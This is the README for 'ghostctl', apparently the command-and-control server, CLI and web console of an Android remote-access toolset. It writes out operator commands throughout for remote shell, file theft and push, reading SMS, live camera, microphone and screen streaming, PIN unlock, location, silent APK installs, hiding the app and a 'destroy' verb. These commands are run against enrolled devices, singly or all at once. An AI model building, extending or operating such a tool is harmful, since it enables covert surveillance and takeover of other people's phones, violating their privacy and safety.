# ghostctl server

Core daemon + CLI for the ghostctl Android remote-control toolset (see ../PROJECT.md).

## Files
- `daemon.py` — core daemon: WebSocket device listener (default `0.0.0.0:8443`),
  device registry (`state.json`), command router + history (`history.json`),
  admin JSON-RPC on `127.0.0.1:8444` (CLI transport), per-device live-stream
  frame cache (`StreamCache`), server→device file push (`files put` framing)
  and the `update self|sidekick` APK push flow.
- `ghostctl.py` — CLI (symlink-friendly, e.g. `ln -s .../ghostctl.py ~/.local/bin/ghostctl`).
- `console.py` — web console (see below).
- `fake_client.py` — mock Android client for testing (echoes verbs, receives
  `files put` streams with sha256 verification, simulates `screen live`).
- `apks/` — APK store for `update` pushes (gitignored; populate with
  `ghostctl.py apks add ghostd|ghosta <path>`).

## Run
```sh
python3 daemon.py                     # defaults: 0.0.0.0:8443, admin 127.0.0.1:8444
python3 daemon.py --port 9000 --admin-port 9001
```

## CLI
```sh
python3 ghostctl.py list                                       # device registry (JSON)
python3 ghostctl.py streams                                    # live stream frame cache
python3 ghostctl.py -d test-1 shell "echo hi"               # per-device command
python3 ghostctl.py -d test-1 files ls /sdcard
python3 ghostctl.py -d test-1 files tree /sdcard --depth 3
python3 ghostctl.py -d test-1 files get /sdcard/x.jpg
python3 ghostctl.py -d test-1 files put /sdcard/Download/x.bin   # server pushes (needs a push op)
python3 ghostctl.py -d test-1 sms recent 20
python3 ghostctl.py -d test-1 screen shot
python3 ghostctl.py -d test-1 screen live --fps 5 --quality 60
python3 ghostctl.py -d test-1 screen stop
python3 ghostctl.py -d test-1 cam snap back
python3 ghostctl.py -d test-1 cam live front --quality high
python3 ghostctl.py -d test-1 mic live
python3 ghostctl.py -d test-1 brightness set 10
python3 ghostctl.py -d test-1 volume set media 30
python3 ghostctl.py -d test-1 ui dump
python3 ghostctl.py -d test-1 ui find --text Login
python3 ghostctl.py -d test-1 tap 100 200
python3 ghostctl.py -d test-1 type "hello world"
python3 ghostctl.py -d test-1 swipe 100 200 300 400
python3 ghostctl.py -d test-1 unlock 1234
python3 ghostctl.py -d test-1 sidekick status
python3 ghostctl.py -d test-1 sidekick install
python3 ghostctl.py -d test-1 loc once
python3 ghostctl.py -d test-1 device info
python3 ghostctl.py -d test-1 hide
python3 ghostctl.py -d test-1 status
python3 ghostctl.py -d test-1 ping
python3 ghostctl.py apks list
python3 ghostctl.py apks add ghosta /path/to/ghosta.apk
python3 ghostctl.py -d test-1 update sidekick               # push APK + sidekick install
python3 ghostctl.py -d test-1 update self --apk /path/to/ghostd.apk
python3 ghostctl.py -d test-1 destroy
python3 ghostctl.py --all update                            # broadcast
python3 ghostctl.py --pretty list                           # human-readable
```
Unknown verbs are rejected with a clean error (daemon whitelist `ACTIONS`).
Admin endpoint configurable via `GHOSTCTL_ADMIN_HOST` / `GHOSTCTL_ADMIN_PORT`.

## Update push
`ghostctl.py -d <id> update self|sidekick [--apk path]` pushes the APK to the
device over the C2 WebSocket using the client's `FileReceiver` protocol
(`files put <dest>` cmd + framed 64 KB `file_chunk` binaries + `file_end`
with sha256), then triggers the install verb (`sidekick install` for ghosta,
`update self` for ghostd). Default APKs live in `server/apks/`
(`ghosta.apk` / `ghostd.apk`, gitignored) — place them with
`ghostctl.py apks add ghostd|ghosta <path>`.

## Stream relay
Devices stream live media as framed binaries (`{"type":"frame","stream":..}`
+ JPEG payload, MediaBus framing). The daemon keeps the latest frame per
(device, stream) in a bounded cache (max 3 streams × 2 frames) and the
console serves it:
- `GET /stream/<id>/feed` — latest frame, `image/jpeg` (poll-friendly; 503
  when nothing is cached)
- `GET /stream/<id>/feed.mjpg` — `multipart/x-mixed-replace` MJPEG

## Web console
```sh
python3 console.py                    # http://127.0.0.1:9443 (localhost only)
GHOST_CONSOLE_PASS=sekrit python3 console.py --port 9443
```
Stdlib-only (http.server), server-rendered HTML, no CDNs — works offline.
Talks to the daemon by importing `ghostctl` and reusing its `rpc()` (admin
port, env `GHOSTCTL_ADMIN_HOST/PORT`). Command history is read read-only
from `history.json`.

- Auth: HTTP Basic on every request. Password from `GHOST_CONSOLE_PASS`;
  if unset, a random one is generated and printed at startup
  (username is ignored — `curl -u ghost:<pass>`).
- Binding: `127.0.0.1` by default. `--host 0.0.0.0` for remote access, but
  only open the firewall when needed (`sudo ufw allow 9443/tcp`); never
  preemptively.
- Pages:
  - `/` device list — online dot, last_seen, battery, IP; auto-refresh 5 s.
  - `/device/<id>` — status + action forms 1:1 with ghostctl verbs (shell,
    ui dump/find, tap/longclick/type/key/swipe/unlock, arm/disarm,
    sidekick status/arm/disarm/ping/install, files ls/tree/get/put,
    screen shot/record/live/stop/off, cam snap/live/stop, mic
    record/live/stop, brightness get/set, volume get/set/mute/unmute,
    wake, sms recent, loc once, device info, update, hide/unhide,
    status, ping, destroy w/ confirm) + per-device command history.
  - `/broadcast` — pick a verb, run it with `--all` semantics.
  - `/stream/<id>` — MJPEG display from the daemon's stream cache
    (`/stream/<id>/feed.mjpg`, single-frame poll at `/stream/<id>/feed`);
    waiting state until a stream is active.
- POST `/device/<id>/cmd` (form fields `verb`, optional `arg`) is the form
  endpoint; results render as a JSON page. Verbs map exactly to ghostctl.py
  (`shell` sends one string arg like the CLI does). The full APK-push update
  flow is CLI-only (`ghostctl.py -d <id> update ...`); the console `update`
  button sends the plain client verb.

## Test
```sh
python3 daemon.py &                 # or use --bind 127.0.0.1
python3 fake_client.py test-1 &      # mock device
python3 ghostctl.py list
python3 ghostctl.py -d test-1 shell "echo hi"
python3 ghostctl.py -d test-1 tap 100 200       # routed verb
python3 ghostctl.py -d test-1 screen live       # fake_client streams framed JPEGs
python3 ghostctl.py streams                     # cached frames
GHOST_CONSOLE_PASS=pw python3 console.py &   # then browse http://127.0.0.1:9443
curl -u ghost:pw -o f.jpg http://127.0.0.1:9443/stream/test-1/feed   # image/jpeg
python3 ghostctl.py apks add ghosta dummy.apk
python3 ghostctl.py -d test-1 update sidekick   # push + install (sha256-checked)
```

Requires `websockets` (`pip install --user websockets`). Do not commit
`state.json` / `history.json` / `apks/` (runtime artifacts, see `.gitignore`).
